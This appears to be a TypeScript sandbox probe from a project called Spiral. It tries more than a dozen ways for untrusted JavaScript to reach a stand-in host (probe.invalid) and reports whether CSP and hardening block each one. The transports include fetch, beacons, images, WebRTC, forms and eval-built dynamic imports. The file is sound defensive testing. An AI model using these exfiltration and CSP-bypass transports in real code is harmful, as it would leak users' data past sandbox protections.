/*
Copyright 2026 the Spiral authors. AGPL-3.0-or-later.

Brief 0066 spike, matrix items 1, 2, 5. Can hostile JS reach the network?

Every transport the platform offers is tried against a host that does not
exist in the artifact's origin. `blocked` means the attempt failed in a way
that cannot have produced a request; `REACHED` means bytes could have left
the device and the feature does not ship in this shape.

A refused connection is NOT automatically a pass: DNS resolution alone is
exfiltration. Where the API cannot distinguish "policy refused" from "server
refused", the check reports `inconclusive` and the spike resolves it with a
packet capture rather than guessing.
*/

import type { CheckResult } from "../types";
import { blockedBy, settle } from "../violations";

/** Somewhere off-origin that would be an obvious beacon if it ever resolved. */
const TARGET = "https://probe.invalid/spiral";

const blocked = (name: string, detail: string): CheckResult => ({
  name,
  verdict: "blocked",
  detail,
});

const reached = (name: string, detail: string): CheckResult => ({
  name,
  verdict: "REACHED",
  detail,
});

const inconclusive = (name: string, detail: string): CheckResult => ({
  name,
  verdict: "inconclusive",
  detail,
});

/**
 * `fetch` rejects with the same opaque `TypeError: Load failed` whether CSP
 * refused it or the host merely failed to resolve — and `probe.invalid` never
 * resolves, so a rejection alone proves nothing about the policy. The
 * engine's own `connect-src` violation is what distinguishes "refused before
 * any packet" from "tried and failed", and without it this check would need a
 * packet capture to mean anything.
 */
const checkFetch = async (): Promise<CheckResult> => {
  try {
    await fetch(TARGET, { mode: "no-cors" });
    return reached("fetch", "fetch() resolved");
  } catch (error) {
    await settle();
    const violation = blockedBy("connect-src");
    return violation
      ? blocked("fetch", `refused by ${violation.directive} before any request`)
      : inconclusive(
          "fetch",
          `rejected (${String(error).slice(0, 60)}) but no connect-src violation — could be DNS; confirm with a capture`,
        );
  }
};

/** Same ambiguity as `fetch`, resolved the same way. */
const checkXhr = async (): Promise<CheckResult> => {
  const outcome = await new Promise<"loaded" | "errored" | "silent">((resolve) => {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", TARGET, true);
      xhr.onload = () => resolve("loaded");
      xhr.onerror = () => resolve("errored");
      xhr.send();
    } catch {
      resolve("errored");
    }
    setTimeout(() => resolve("silent"), 2_000);
  });

  if (outcome === "loaded") return reached("xhr", "onload fired");

  await settle();
  const violation = blockedBy("connect-src");
  if (violation) return blocked("xhr", `refused by ${violation.directive} before any request`);
  return inconclusive("xhr", `${outcome}, no connect-src violation; confirm with a capture`);
};

const checkWebSocket = async (): Promise<CheckResult> => {
  try {
    // `harden.ts` deletes the constructor; if this throws, that worked.
    const ctor = (globalThis as { WebSocket?: typeof WebSocket }).WebSocket;
    if (!ctor) return blocked("websocket", "constructor removed by harden()");
    const socket = new ctor("wss://probe.invalid/spiral");
    socket.close();
    return reached("websocket", "constructor accepted a URL");
  } catch (error) {
    return blocked("websocket", String(error).slice(0, 120));
  }
};

const checkEventSource = async (): Promise<CheckResult> => {
  try {
    const ctor = (globalThis as { EventSource?: typeof EventSource }).EventSource;
    if (!ctor) return blocked("eventsource", "constructor removed by harden()");
    const source = new ctor(TARGET);
    source.close();
    return reached("eventsource", "constructor accepted a URL");
  } catch (error) {
    return blocked("eventsource", String(error).slice(0, 120));
  }
};

const checkBeacon = async (): Promise<CheckResult> => {
  try {
    const sent = navigator.sendBeacon?.(TARGET, "x");
    return sent ? reached("sendBeacon", "returned true") : blocked("sendBeacon", "returned false");
  } catch (error) {
    return blocked("sendBeacon", String(error).slice(0, 120));
  }
};

const checkImage = async (): Promise<CheckResult> => {
  const loaded = await new Promise<boolean>((resolve) => {
    const image = new Image();
    image.onload = () => resolve(true);
    image.onerror = () => resolve(false);
    image.src = `${TARGET}.png`;
    setTimeout(() => resolve(false), 2_000);
  });

  if (loaded) return reached("img", "image loaded");

  await settle();
  const violation = blockedBy("img-src");
  return violation
    ? blocked("img", `refused by ${violation.directive}`)
    : inconclusive("img", "error with no img-src violation; confirm with a capture");
};

const checkStylesheet = async (): Promise<CheckResult> => {
  const loaded = await new Promise<boolean>((resolve) => {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.onload = () => resolve(true);
    link.onerror = () => resolve(false);
    link.href = `${TARGET}.css`;
    document.head.appendChild(link);
    setTimeout(() => resolve(false), 2_000);
  });

  if (loaded) return reached("css", "stylesheet loaded");

  await settle();
  const violation = blockedBy("style-src");
  return violation
    ? blocked("css", `refused by ${violation.directive}`)
    : inconclusive("css", "error with no style-src violation; confirm with a capture");
};

/**
 * A literal `import("https://…")` never gets this far: `transpile.ts` refuses
 * any specifier outside the runtime allow-list, so the artifact would fail to
 * compile. That compile-time filter is a real defence, and it is covered by
 * `transpile.test.ts`.
 *
 * The interesting question is whether it can be *bypassed* at runtime, so the
 * probe reaches for the two constructors that build code from strings. CSP
 * without `unsafe-eval` should stop both — and if it does not, the dynamic
 * import behind them still has to get past `connect-src`.
 */
const checkEvalBypass = async (): Promise<CheckResult> => {
  const attempts: string[] = [];

  try {
    const build = new Function("u", "return import(u)") as (u: string) => Promise<unknown>;
    await build(`${TARGET}.js`);
    return reached("eval-bypass", "new Function built a working dynamic import");
  } catch (error) {
    attempts.push(`Function: ${String(error).slice(0, 60)}`);
  }

  try {
    // Indirect eval, which runs in global scope and is the usual CSP probe.
    const indirect = eval;
    await (indirect(`import("${TARGET}.js")`) as Promise<unknown>);
    return reached("eval-bypass", "indirect eval performed a dynamic import");
  } catch (error) {
    attempts.push(`eval: ${String(error).slice(0, 60)}`);
  }

  return blocked("eval-bypass", attempts.join(" | "));
};

/**
 * Spike item 6 — `import(blob:)` — is not checked here, and cannot be: an
 * artifact may not write a computed `import(x)` at all, because
 * `transpile.ts` only allows specifiers from a static allow-list. That closes
 * the blob vector at COMPILE time, before CSP is even consulted.
 *
 * The mechanism is still proven every run: the bootstrap loads this very
 * probe by compiling it to a blob and importing it. If this code is
 * executing, `import(blob:)` works for the runtime. If an artifact could
 * reach it, that would show up as `eval-bypass: REACHED` above.
 */
const checkBlobViaEval = async (): Promise<CheckResult> => {
  try {
    const blob = new Blob([`export default 1;`], { type: "text/javascript" });
    const url = URL.createObjectURL(blob);
    try {
      const build = new Function("u", "return import(u)") as (u: string) => Promise<unknown>;
      await build(url);
      return reached("blob-via-eval", "Function+blob import executed attacker code");
    } finally {
      URL.revokeObjectURL(url);
    }
  } catch (error) {
    return blocked("blob-via-eval", String(error).slice(0, 120));
  }
};

/**
 * `new Worker(url)` returns an object even when CSP forbids the worker from
 * loading, so the constructor's success proves nothing. The engine's own
 * `worker-src` violation is the answer.
 */
const checkWorker = async (): Promise<CheckResult> => {
  try {
    const blob = new Blob(["self.close()"], { type: "text/javascript" });
    const worker = new Worker(URL.createObjectURL(blob));
    await settle();
    worker.terminate();

    const violation = blockedBy("worker-src");
    return violation
      ? blocked("worker", `refused by ${violation.directive}`)
      : reached("worker", "Worker constructed and no worker-src violation was reported");
  } catch (error) {
    return blocked("worker", String(error).slice(0, 120));
  }
};

const checkServiceWorker = async (): Promise<CheckResult> => {
  try {
    if (!("serviceWorker" in navigator)) {
      return blocked("serviceworker", "navigator.serviceWorker absent (opaque origin)");
    }
    await navigator.serviceWorker.register("./sw.js");
    return reached("serviceworker", "registration resolved");
  } catch (error) {
    return blocked("serviceworker", String(error).slice(0, 120));
  }
};

/**
 * The one transport CSP does not govern. `harden.ts` deletes the
 * constructors before artifact code runs; this verifies that held, and that
 * no alternate spelling survives.
 */
const checkWebRtc = async (): Promise<CheckResult> => {
  const names = [
    "RTCPeerConnection",
    "webkitRTCPeerConnection",
    "mozRTCPeerConnection",
  ] as const;

  for (const name of names) {
    const ctor = (globalThis as Record<string, unknown>)[name];
    if (typeof ctor !== "function") continue;
    try {
      const connection = new (ctor as new (config: unknown) => RTCPeerConnection)({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
      });
      connection.close();
      return reached("webrtc", `${name} constructed with a STUN server`);
    } catch (error) {
      return blocked("webrtc", `${name}: ${String(error).slice(0, 100)}`);
    }
  }
  return blocked("webrtc", "no RTCPeerConnection constructor in this realm");
};

/**
 * `submit()` reports nothing either way, so this too is judged by the
 * engine's `form-action` violation rather than by a return value.
 */
const checkFormSubmit = async (): Promise<CheckResult> => {
  try {
    const form = document.createElement("form");
    form.method = "POST";
    form.action = TARGET;
    document.body.appendChild(form);
    const before = location.href;
    form.submit();
    await settle();
    form.remove();

    const violation = blockedBy("form-action");
    if (violation) return blocked("form-submit", `refused by ${violation.directive}`);

    // No CSP violation fires when the SANDBOX refuses first: a frame without
    // `allow-forms` cannot submit at all, and that check happens before the
    // policy is consulted. An opaque origin proves the frame is sandboxed
    // (no `allow-same-origin`), and an unchanged URL proves nothing
    // navigated — together that is the sandbox refusing, not a silent send.
    const stillHere = location.href === before;
    const opaque = origin === "null";
    if (stillHere && opaque) {
      return blocked("form-submit", "sandboxed frame without allow-forms; no navigation occurred");
    }

    return inconclusive(
      "form-submit",
      `no violation, origin=${origin}, navigated=${!stillHere}; confirm with a packet capture`,
    );
  } catch (error) {
    return blocked("form-submit", String(error).slice(0, 120));
  }
};

export const runNetworkChecks = async (): Promise<readonly CheckResult[]> => [
  await checkFetch(),
  await checkXhr(),
  await checkWebSocket(),
  await checkEventSource(),
  await checkBeacon(),
  await checkImage(),
  await checkStylesheet(),
  await checkEvalBypass(),
  await checkBlobViaEval(),
  await checkWorker(),
  await checkServiceWorker(),
  await checkWebRtc(),
  await checkFormSubmit(),
];
